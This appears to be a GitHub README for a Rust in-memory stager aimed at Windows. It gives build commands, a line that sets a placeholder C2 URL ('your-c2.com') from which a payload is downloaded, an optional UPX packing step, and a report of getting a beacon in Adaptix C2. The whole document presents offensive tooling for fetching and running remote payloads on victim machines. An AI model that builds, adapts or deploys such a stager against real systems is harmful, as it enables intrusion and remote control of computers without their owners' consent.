# in-memory stager written in Rust 

---

## Cross Compilation

```bash
cargo build --release --target x86_64-pc-windows-gnu
```

## Usage

```rust
# 1. Edit src/main.rs → change the URL
let url = "https://your-c2.com/payload_x64.bin";

# 2. Build (from macOS/Linux)
cargo clean
cargo build --release --target x86_64-pc-windows-gnu

# 3. Compress (optional, but sexy)
upx --best target/x86_64-pc-windows-gnu/release/downloader.exe
```

---

I used python http to host the payload.

<img width="866" height="230" alt="Screenshot 2025-11-23 at 4 07 48 PM" src="https://github.com/user-attachments/assets/4255cef6-c886-4981-8df1-7d8e2835387e" />


---

### Got a beacon connection in Adaptix C2

<img width="948" height="552" alt="Screenshot 2025-11-23 at 4 07 37 PM" src="https://github.com/user-attachments/assets/6839e554-fc1d-44cc-8699-2f7fcd91b070" />


---



